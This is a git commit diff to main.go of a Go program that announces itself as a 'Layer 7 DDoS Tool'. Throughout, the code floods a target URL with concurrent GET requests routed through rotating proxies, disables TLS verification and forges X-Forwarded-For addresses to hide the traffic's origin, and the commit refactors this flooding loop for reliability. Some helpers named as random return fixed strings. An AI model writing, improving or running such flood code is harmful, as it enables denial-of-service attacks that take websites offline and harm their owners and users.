31e78c1f5c4d70d27c938b13c772ba97a26229ae
whitehat57 <86547977+whitehat57@users.noreply.github.com>
2024-12-11 11:21:47 +0700

    Update main.go

--- main.go
+++ main.go
@@ -4,16 +4,17 @@ import (
 	"bufio"
 	"crypto/tls"
 	"fmt"
+	"log"
 	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 )
 
-// Constants and configurations
 const (
 	banner = `    _____  __         _      
    / ___/ / /_ _____ (_)_  __
@@ -33,8 +34,9 @@ type Config struct {
 	ProxyFile string
 }
 
+var logger = log.New(os.Stdout, "[INFO] ", log.LstdFlags|log.Lshortfile)
+
 func main() {
-	// Parse command line arguments
 	if len(os.Args) < 6 {
 		fmt.Println(usage)
 		os.Exit(1)
@@ -48,17 +50,13 @@ func main() {
 		ProxyFile: os.Args[5],
 	}
 
-	// Display banner and info
 	printBanner(config)
-
-	// Load proxies
 	proxies := loadProxies(config.ProxyFile)
+
 	if len(proxies) == 0 {
-		fmt.Println("Error: No proxies loaded")
-		os.Exit(1)
+		logger.Fatal("No proxies loaded. Exiting.")
 	}
 
-	// Start attack
 	var wg sync.WaitGroup
 	for i := 1; i <= config.Threads; i++ {
 		wg.Add(1)
@@ -68,79 +66,22 @@ func main() {
 		}(i)
 	}
 
-	// Wait for duration
 	time.Sleep(time.Duration(config.Time) * time.Second)
-	fmt.Printf("\n[HTTP/3] (%s) Attack Completed\n", getCurrentTime())
-}
-
-func workerThread(id int, config *Config, proxies []string) {
-	fmt.Printf("[HTTP/3] (%s) Worker Thread %d Started\n", getCurrentTime(), id)
-
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-			},
-			Proxy: func(_ *http.Request) (*url.URL, error) {
-				proxy := proxies[rand.Intn(len(proxies))]
-				return url.Parse("http://" + proxy)
-			},
-		},
-		Timeout: 10 * time.Second,
-	}
-
-	targetURL, err := url.Parse(config.Target)
-	if err != nil {
-		fmt.Printf("Error parsing target URL: %v\n", err)
-		return
-	}
-
-	// Attack loop
-	for {
-		for i := 0; i < config.Rate; i++ {
-			go func() {
-				req := buildRequest(targetURL)
-				_, err := client.Do(req)
-				if err != nil {
-					// Silently ignore errors
-					return
-				}
-			}()
-		}
-		time.Sleep(time.Second)
-	}
-}
-
-func buildRequest(targetURL *url.URL) *http.Request {
-	req, _ := http.NewRequest("GET", targetURL.String(), nil)
-
-	// Add headers similar to the original script
-	req.Header.Set("User-Agent", getRandomUserAgent())
-	req.Header.Set("Accept", getRandomAccept())
-	req.Header.Set("Accept-Language", getRandomLanguage())
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-	req.Header.Set("X-Forwarded-For", generateIP())
-	req.Header.Set("Origin", targetURL.Scheme+"://"+targetURL.Host)
-
-	return req
-}
-
-// Helper functions
-func getCurrentTime() string {
-	return time.Now().Format("15:04:05")
+	logger.Println("Attack Completed.")
 }
 
 func parseInt(s string) int {
-	val := 0
-	fmt.Sscanf(s, "%d", &val)
+	val, err := strconv.Atoi(s)
+	if err != nil {
+		logger.Fatalf("Error parsing integer: %v", err)
+	}
 	return val
 }
 
 func loadProxies(filename string) []string {
 	file, err := os.Open(filename)
 	if err != nil {
-		fmt.Printf("Error opening proxy file: %v\n", err)
-		return nil
+		logger.Fatalf("Error opening proxy file: %v", err)
 	}
 	defer file.Close()
 
@@ -148,11 +89,19 @@ func loadProxies(filename string) []string {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		proxy := strings.TrimSpace(scanner.Text())
-		if proxy != "" {
+		if proxy != "" && validateProxyFormat(proxy) {
 			proxies = append(proxies, proxy)
 		}
 	}
+	if err := scanner.Err(); err != nil {
+		logger.Fatalf("Error reading proxies: %v", err)
+	}
 	return proxies
+}
+
+func validateProxyFormat(proxy string) bool {
+	_, err := url.Parse("http://" + proxy)
+	return err == nil
 }
 
 func printBanner(config *Config) {
@@ -161,10 +110,75 @@ func printBanner(config *Config) {
 	fmt.Printf("-> Target \t: %s\n", config.Target)
 	fmt.Printf("-> Time \t: %d seconds\n", config.Time)
 	fmt.Printf("-> Rate \t: %d\n", config.Rate)
-	fmt.Printf("-> Thread \t: %d\n", config.Threads)
+	fmt.Printf("-> Threads\t: %d\n", config.Threads)
 	fmt.Printf("-> ProxyFile\t: %s\n", config.ProxyFile)
 	fmt.Println("-------------------------------------------")
-	fmt.Println("-> xxx Layer 7 DDoS Tool xxx")
+	fmt.Println("-> Layer 7 DDoS Tool Initialized")
 	fmt.Println("-------------------------------------------")
 	fmt.Println()
+}
+
+func workerThread(id int, config *Config, proxies []string) {
+	logger.Printf("Worker Thread %d Started\n", id)
+	client := createHTTPClient(proxies)
+	targetURL, err := url.Parse(config.Target)
+	if err != nil {
+		logger.Printf("Error parsing target URL: %v", err)
+		return
+	}
+
+	ticker := time.NewTicker(time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		var wg sync.WaitGroup
+		for i := 0; i < config.Rate; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				req := buildRequest(targetURL)
+				resp, err := client.Do(req)
+				if err != nil {
+					logger.Printf("Request error: %v", err)
+					return
+				}
+				resp.Body.Close()
+			}()
+		}
+		wg.Wait()
+	}
+}
+
+func createHTTPClient(proxies []string) *http.Client {
+	return &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			Proxy: func(_ *http.Request) (*url.URL, error) {
+				proxy := proxies[rand.Intn(len(proxies))]
+				return url.Parse("http://" + proxy)
+			},
+		},
+		Timeout: 10 * time.Second,
+	}
+}
+
+func buildRequest(targetURL *url.URL) *http.Request {
+	req, _ := http.NewRequest("GET", targetURL.String(), nil)
+	req.Header.Set("User-Agent", getRandomUserAgent())
+	req.Header.Set("Accept", getRandomAccept())
+	req.Header.Set("Accept-Language", getRandomLanguage())
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("X-Forwarded-For", generateIP())
+	req.Header.Set("Origin", targetURL.Scheme+"://"+targetURL.Host)
+	return req
+}
+
+// Simulasi header random untuk meningkatkan efektivitas
+func getRandomUserAgent() string   { return "Mozilla/5.0 (compatible; CustomBot/1.0)" }
+func getRandomAccept() string      { return "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
+func getRandomLanguage() string    { return "en-US,en;q=0.5" }
+func generateIP() string           { return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)) }
+
+func getCurrentTime() string {
+	return time.Now().Format("15:04:05")
 }
